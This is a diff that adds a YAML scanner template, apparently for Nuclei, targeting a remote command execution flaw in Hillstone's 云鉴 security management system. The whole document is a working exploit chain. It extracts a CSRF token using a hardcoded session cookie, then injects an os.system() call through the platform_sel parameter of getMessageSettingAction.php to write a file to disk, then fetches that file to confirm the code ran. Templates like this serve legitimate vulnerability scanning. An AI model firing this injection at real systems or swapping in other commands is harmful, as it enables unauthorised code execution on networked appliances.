@@ -1,0 +1,68 @@
+id: hillstonenet-getmessagesettingaction-rce
+info:
+  name: 山石网科云鉴安全管理系统 getMessageSettingAction 命令执行
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: rce
+  description: |
+    Exploits a remote command execution vulnerability in 山石网科云鉴安全管理系统 getMessageSettingAction.
+
+variables:
+  t1: "{{rand_int(111000,999000)}}"
+  t2: "{{rand_int(111000111000,999000999000)}}"
+
+flow: |
+  http(1) && http(2) && http(3)
+
+http:
+  - id: get-token
+    method: POST
+    path:
+      - /master/ajaxActions/getTokenAction.php
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+      Cookie: "PHPSESSID=emhpeXVhbg;"
+    matchers-condition: and
+    matchers:
+      - type: regex
+        regex:
+          - "^[a-f0-9]{32}$"
+        part: body
+    extractors:
+      - type: regex
+        part: body
+        name: token
+        internal: true
+        group: 0
+        regex:
+          - "(?P<token>^[a-f0-9]{32})"
+
+  - id: trigger-rce
+    method: GET
+    path:
+      - "/master/ajaxActions/getMessageSettingAction.php?token_csrf={{token}}&company_uuid=aaa&platform_sel=os.system('echo+{{t2}}+>+/opt/var/majorsec/installation/master/runtime/img/config{{t1}}')"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+      Cookie: "PHPSESSID=emhpeXVhbg;"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+  - id: verify-output
+    method: GET
+    path:
+      - "/master/img/config{{t1}}"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+      Cookie: "PHPSESSID=emhpeXVhbg;"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "{{t2}}"
+        part: body
